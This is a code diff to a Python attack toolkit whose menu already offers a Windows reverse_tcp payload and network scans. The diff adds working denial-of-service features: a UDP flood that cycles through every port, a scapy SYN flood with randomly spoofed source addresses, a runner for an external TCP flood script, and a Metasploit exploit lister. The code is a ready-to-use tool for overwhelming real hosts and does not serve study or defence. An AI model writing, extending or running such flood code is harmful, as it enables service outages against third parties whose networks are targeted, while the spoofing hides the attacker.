@@ -103,6 +103,7 @@ def help():
      ░  ░      ░     ░                 ░  ░  ░  ░░   ░   ░   ░                 ░ 
 \033[0m		            ░                                                             
 ?       :	displays this message
+clear   :	clears screen except for banner
 exit    :	exits script
 rebootl :	reboot whole device
 winload :	windows reverse_tcp payload
@@ -123,6 +124,11 @@ scannet :	scan for networks around you
 port    :	scan for ports on a host
 info    :	info gather on a host [includes port scan]
 sysinfo :	info about your system
+msfex   :	shows all metasploit exploits [takes a bit]
+udp     :	UDP flood / dos
+tcp     :	TCP flood / dos
+syn     :	SYN flood / dos
+ping    :	pings host
 \033[91m---------------------------------------------------------------------------------\033[0m
 	"""
 def winload():
@@ -532,6 +538,78 @@ def sysinfo():
 	gateway = gw[2]
 	host = socket.gethostname()
 	print (" IP: ", ipaddr, " Gateway: ", gateway, " Host: ", host)
+def msfex():
+	os.system("msfconsole -x show exploits")
+def udp():
+	target = raw_input(N+"Target:\033[91m ")
+	ip = socket.gethostbyname(target)
+	port = input(N+"Port:\033[91m ")
+	os.system("service tor restart")
+	print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+	os.system("sleep 2s")
+	sent = 0
+	print "KILLING %s CONNECTIONS"%(ip)						
+	while True:
+		sock.sendto(Gb, (ip,port))
+		sock.sendto(bytes, (ip,port))
+		sock.sendto(Kb, (ip,port))
+		sent = sent + 1
+		port = port + 1
+		print B+"|+| Slapping \033[0m|\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
+		if port == 65534:
+			port = 1
+def tcp():
+	tcp = raw_input(Y+"[\033[92m+\033[91m-\033[0mTCP\033[91m-\033[92m+\033[93m]\033[0m ")
+	os.system("python " + tcp)
+def syn():
+  def randomIP():
+    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+    return ip
+
+  def randInt():
+    x = random.randint(1000,9000)
+    return x  
+
+  def SYN_Flood(dstIP,dstPort,counter):
+    total = 0
+    print "Packets are sending ..."
+    for x in range (0,counter):
+      s_port = randInt()
+      s_eq = randInt()
+      w_indow = randInt()
+
+      IP_Packet = IP ()
+      IP_Packet.src = randomIP()
+      IP_Packet.dst = dstIP
+
+      TCP_Packet = TCP () 
+      TCP_Packet.sport = s_port
+      TCP_Packet.dport = dstPort
+      TCP_Packet.flags = "S"
+      TCP_Packet.seq = s_eq
+      TCP_Packet.window = w_indow
+
+      send(IP_Packet/TCP_Packet, verbose=0)
+      total+=1
+    sys.stdout.write("\nTotal packets sent: %i\n" % total)
+
+
+  def info():
+
+    dstIP = raw_input ("\nTarget IP : ")
+    dstPort = input ("Target Port : ")
+    
+    return dstIP,int(dstPort)
+    
+
+  def main():
+    dstIP,dstPort = info()
+    counter = input ("Packets : ")
+    SYN_Flood(dstIP,dstPort,int(counter))
+
+  main()
+
+
 def main():
 	found = False
 	while not found:
@@ -593,6 +671,14 @@ def main():
 			info()
 		if x == "sysinfo":
 			sysinfo()
+		if x == "msfex":
+			msfex()
+		if x == "udp":
+			udp()
+		if x == "tcp":
+			tcp()
+		if x == "syn":
+			syn()
 	found = True
 mainbanner()
 main()
